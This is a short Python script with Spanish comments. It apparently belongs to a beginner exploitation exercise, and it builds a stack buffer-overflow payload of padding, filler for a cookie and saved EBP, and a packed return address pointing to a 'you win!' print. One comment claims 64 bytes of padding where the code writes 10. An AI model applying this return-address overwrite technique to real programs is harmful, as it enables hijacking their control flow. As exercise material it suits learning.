#payload.py
from struct import pack

ret_addr = 0x804849c # Direccion de printf("you win!")
output = "A" * 10 # Rellena el buffer con 64 bytes
output += "BBBB" # Cookie
output += "CCCC" # EBP
output += pack("<I", ret_addr) #establece return address
print(output)